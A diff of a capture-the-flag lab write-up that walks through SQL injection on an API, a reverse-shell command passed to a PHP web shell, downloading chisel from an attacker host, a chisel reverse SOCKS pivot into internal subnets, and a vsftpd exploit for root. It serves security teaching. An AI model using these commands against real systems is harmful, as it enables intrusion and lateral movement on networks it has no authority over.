@@ -112,7 +112,7 @@ info.php
 ![image](https://user-images.githubusercontent.com/68326057/124985436-07f25d00-e058-11eb-8066-0f759942b781.png)
 
 
-Now I have the key I visited that site
+Now I have the key I visited that site.
 
 http://10.10.245.245/api.php?apikey=WEBLhvOJAH8d50Z4y5G5
 
@@ -127,19 +127,19 @@ http://10.10.245.245/api.php?apikey=WEBLhvOJAH8d50Z4y5G5&documentid=1
 
 So it is using sql connection.
 
-Since we know `documentid` is the only thing using sql I tested it
+Since we know `documentid` is the only thing using sql I only tested it.
 
 ## SQL INJECTION
 
 ![image](https://user-images.githubusercontent.com/68326057/124986468-40df0180-e059-11eb-843d-becd7df275ef.png)
 
-So it is using MYSQL
+So it is using MYSQL.
 
 
 ![image](https://user-images.githubusercontent.com/68326057/124988356-84d30600-e05b-11eb-8a18-590d2c7acb53.png)
 
 
-API key is Using this function
+API key is Using this function.
 
 ![image](https://user-images.githubusercontent.com/68326057/124988668-e5fad980-e05b-11eb-923d-9a89a8e6f919.png)
 
@@ -193,13 +193,91 @@ http://10.10.20.199/rev.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;
 
 # USER WWW-DATA
 
-First Thing I did is I connected with mysql
-![image](https://user-images.githubusercontent.com/68326057/125000735-aee1f380-e06e-11eb-8db1-1552e169e2ba.png)
-
+Flag Location:-
 
 ![image](https://user-images.githubusercontent.com/68326057/125000899-0bdda980-e06f-11eb-8a31-804a4693bc50.png)
 
 
+First Thing I did is I connected with mysql
+![image](https://user-images.githubusercontent.com/68326057/125000735-aee1f380-e06e-11eb-8db1-1552e169e2ba.png)
+
+
+
 ![image](https://user-images.githubusercontent.com/68326057/125000986-40e9fc00-e06f-11eb-9c6f-ce8f93696752.png)
+
+
+![image](https://user-images.githubusercontent.com/68326057/125016352-d943a900-e08e-11eb-8d2f-4f6061160248.png)
+
+These are the only things I have in this docker machine.
+
+![image](https://user-images.githubusercontent.com/68326057/125016433-fe381c00-e08e-11eb-8272-655aa0f822a5.png)
+
+So I get two ranges one :- 
+
+1. 172.16.1.0/24
+2. 172.18.0.0/16
+
+I Created a php script to upload a file.
+
+![image](https://user-images.githubusercontent.com/68326057/125018310-76541100-e092-11eb-9ab9-ce4ef7fa1e93.png)
+
+![image](https://user-images.githubusercontent.com/68326057/125018808-74d71880-e093-11eb-9d2a-7282e1e71f9c.png)
+
+![image](https://user-images.githubusercontent.com/68326057/125018825-7d2f5380-e093-11eb-9378-7c17957eb61d.png)
+
+![image](https://user-images.githubusercontent.com/68326057/125018861-8c160600-e093-11eb-8b37-455b070ceb97.png)
+
+Second way to download a file:-
+
+```bash
+python3
+import urllib.request
+url= 'http://IP:8000/chisel'
+urllib.request.urlretrieve(url, "chisel")
+```
+## Pivoting through Reverse Socks Proxy
+
+To Learn this watch :-
+https://www.youtube.com/watch?v=Yp4oxoQIBAM AT:- 1:30:48
+
+
+Step-1 On Attacker
+
+```bash
+./chisel server -p 8000  -reverse
+```
+
+Step -2 On victim Machine
+
+```bash
+./chisel client <Your IP>:8000 R:8001:127.0.0.1:1337
+```
+
+Step -3 Again On victim Machine
+
+```bash
+./chisel server -p 1337 --socks5
+```
+
+Step -4 On Attacker Machine
+
+```bash
+./chisel client 127.0.0.1:8001 socks
+```
+
+
+# 172.16.1.128
+
+## VFTPD Exploit
+
+https://www.exploit-db.com/exploits/49757
+
+![image](https://user-images.githubusercontent.com/68326057/125134645-502b8100-e125-11eb-81ab-d927ae8542a4.png)
+
+![image](https://user-images.githubusercontent.com/68326057/125134763-8832c400-e125-11eb-8c52-88a2a6e166bf.png)
+
+We are already root user of this machine.
+
+![image](https://user-images.githubusercontent.com/68326057/125134901-bfa17080-e125-11eb-806f-db98b5c2fc38.png)
 
 
